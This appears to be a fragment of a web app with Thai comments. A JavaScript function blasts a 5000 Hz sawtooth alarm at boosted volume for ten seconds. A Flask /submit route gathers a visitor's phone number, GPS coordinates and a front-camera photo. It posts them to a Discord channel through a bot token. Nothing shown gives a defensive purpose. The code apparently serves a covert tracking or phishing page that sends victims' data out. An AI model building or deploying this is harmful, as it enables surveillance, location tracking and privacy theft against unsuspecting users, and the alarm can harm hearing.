        function playLoudAlarm() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                
                // สร้างเสียงเตือนความถี่สูงปรอทแตก (5000 Hz) ลากยาว 10 วินาทีเต็ม
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                
                osc.type = 'sawtooth'; // คลื่นเลื่อยแหลมแสบแก้วหูที่สุด
                osc.frequency.setValueAtTime(5000, audioCtx.currentTime); // ความถี่สูงปรี๊ด 5000Hz
                
                // อัดเกนความดังทะลุเพดาน
                gain.gain.setValueAtTime(3.0, audioCtx.currentTime);
                
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                
                const startTime = audioCtx.currentTime;
                const duration = 10.0; // ลากยาว 10 วินาที
                
                osc.start(startTime);
                osc.stop(startTime + duration);
                
                setTimeout(() => {
                    audioCtx.close();
                }, duration * 1000);
            } catch (e) {
                console.log("Audio error: ", e);
            }
        }

def send_discord_bot_message(message, image_data=None):
    url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages"
    headers = {
        "Authorization": f"Bot {DISCORD_BOT_TOKEN}"
    }
    
    # ถ้ามีรูปภาพถ่ายจากกล้องหน้า ส่งแบบ แนบไฟล์รูปภาพไปที่ Discord ด้วย
    if image_data:
        import base64
        import io
        
        header, encoded = image_data.split(",", 1)
        image_bytes = base64.b64decode(encoded)
        
        files = {
            'file': ('capture.jpg', io.BytesIO(image_bytes), 'image/jpeg')
        }
        data = {
            'content': message
        }
        try:
            requests.post(url, headers=headers, data=data, files=files)
        except Exception as e:
            print(f"Error sending message with image: {e}")
    else:
        headers["Content-Type"] = "application/json"
        payload = {"content": message}
        try:
            requests.post(url, json=payload, headers=headers)
        except Exception as e:
            print(f"Error sending message: {e}")

@app.route("/submit", methods=["POST"])
def submit():
    phone_number = request.form.get("phone_number")
    lat = request.form.get("latitude")
    lon = request.form.get("longitude")
    image_data = request.form.get("image_data")
    
    message = f"📱 **มีการกรอกข้อมูล:**\nเบอร์: `{phone_number}`"
    if lat and lon:
        message += f"\n📍 **พิกัด:** https://www.google.com/maps?q={lat},{lon}"
    else:
        message += f"\n📍 **พิกัด:** ไม่ได้รับอนุญาตหรือดึงไม่ได้"
        
    send_discord_bot_message(message, image_data)
    return render_template_string(RESULT_TEMPLATE)
